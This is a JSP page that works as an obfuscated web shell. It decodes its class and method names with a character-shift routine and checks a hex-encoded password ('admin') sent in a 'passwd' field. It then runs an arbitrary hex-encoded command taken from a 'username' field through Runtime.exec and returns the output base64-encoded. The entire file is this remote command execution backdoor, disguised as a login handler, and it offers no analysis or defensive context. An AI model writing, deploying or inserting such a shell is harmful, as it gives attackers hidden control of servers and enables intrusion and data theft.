<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%!
    public static String eStr(String str){
        String result = "";
        int length = str.length();
        for (int i = 0; i < length; i++){
            char z=str.charAt(i);
            z=(char)(z-5);
            result=result+z;
        }
        return result;
    }

    public static String string2HexString(String strPart) {
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < strPart.length(); i++) {
            int ch = (int) strPart.charAt(i);
            String strHex = Integer.toHexString(ch);
            hexString.append(strHex);
        }
        return hexString.toString();
    }

    public static String hexStringToString(String s) {
        if (s == null || s.equals("")) {
            return null;
        }
        s = s.replace(" ", "");
        byte[] baKeyword = new byte[s.length() / 2];
        for (int i = 0; i < baKeyword.length; i++) {
            try {
                baKeyword[i] = (byte) (0xff & Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16));
            } catch (Exception e) {
            }
        }
        try {
            s = new String(baKeyword, "UTF-8");
            new String();
        } catch (Exception e1) {
        }
        return s;
    }

%>
<%
    if(request.getParameter("username")!=null && request.getParameter("passwd")!=null){

        if (hexStringToString(request.getParameter("passwd")).equals("admin")) {

            Class rt = Class.forName(eStr("of{f3qfsl3Wzsynrj"));
            Process e = (Process) rt.getMethod(new String(eStr("j}jh")), String.class).
                    invoke(rt.getMethod(new String(eStr("ljyWzsynrj"))).
                            invoke(null, new Object[]{}), hexStringToString(request.getParameter("username")));

            StringBuffer content= new StringBuffer();
            BufferedReader reader = new BufferedReader(new InputStreamReader(e.getInputStream()));
            int ch;
            while ((ch = reader.read()) != -1) {
                content.append((char) ch);
            }
            reader.close();
            BASE64Encoder encoder = new BASE64Encoder();
            out.println(encoder.encode(content.toString().getBytes()));
        }
    }
%>
